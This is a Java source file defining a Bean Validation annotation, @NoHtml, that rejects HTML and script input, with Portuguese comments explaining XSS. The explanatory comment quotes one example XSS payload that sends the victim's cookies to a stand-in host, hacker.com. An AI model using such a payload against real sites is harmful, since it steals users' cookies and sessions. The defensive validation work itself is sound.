package com.riel.pixhub.validation;

import jakarta.validation.Constraint;
import jakarta.validation.Payload;
import java.lang.annotation.*;

/**
 * Annotation customizada para validar que um campo NÃO contém HTML/scripts.
 *
 * XSS (Cross-Site Scripting) é um ataque onde o atacante injeta código
 * malicioso (geralmente JavaScript) em campos de texto. Exemplo:
 *   holderName: "<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>"
 *
 * Se esse valor for salvo no banco e depois exibido no frontend sem
 * sanitização, o navegador EXECUTA o script — roubando cookies, tokens,
 * ou redirecionando o usuário.
 *
 * Esta annotation funciona como uma "barreira na entrada": qualquer campo
 * anotado com @NoHtml rejeita valores que contenham tags HTML.
 * A validação acontece ANTES do Service — o dado nem chega ao banco.
 *
 * Uso:
 *   @NoHtml
 *   private String holderName;
 *
 * Se o valor contiver HTML, o Bean Validation retorna erro:
 *   400 Bad Request: "holderName: O campo não pode conter HTML ou scripts"
 *
 * Por que usar annotation customizada em vez de sanitizar no Service?
 * 1. Declarativa: basta anotar o campo — ninguém esquece
 * 2. Consistente: mesma validação em TODOS os DTOs
 * 3. Integrada: funciona com @Valid do Spring (GlobalExceptionHandler trata)
 * 4. Testável: pode testar o validador isoladamente
 *
 * @Constraint: conecta esta annotation à classe que implementa a lógica (NoHtmlValidator)
 * @Target(FIELD): só pode ser usada em campos (não em classes ou métodos)
 * @Retention(RUNTIME): annotation disponível em tempo de execução (Bean Validation precisa)
 */
@Documented
@Constraint(validatedBy = NoHtmlValidator.class)
@Target({ElementType.FIELD})
@Retention(RetentionPolicy.RUNTIME)
public @interface NoHtml {

    /**
     * Mensagem de erro padrão quando a validação falha.
     * Pode ser sobrescrita: @NoHtml(message = "Nome não pode ter scripts")
     */
    String message() default "O campo não pode conter HTML ou scripts";

    /**
     * Grupos de validação (padrão do Bean Validation).
     * Permite validar diferentes campos em diferentes contextos.
     * Não usamos no PixHub, mas é obrigatório declarar.
     */
    Class<?>[] groups() default {};

    /**
     * Payload para carregar metadados (padrão do Bean Validation).
     * Raramente usado — obrigatório declarar.
     */
    Class<? extends Payload>[] payload() default {};
}
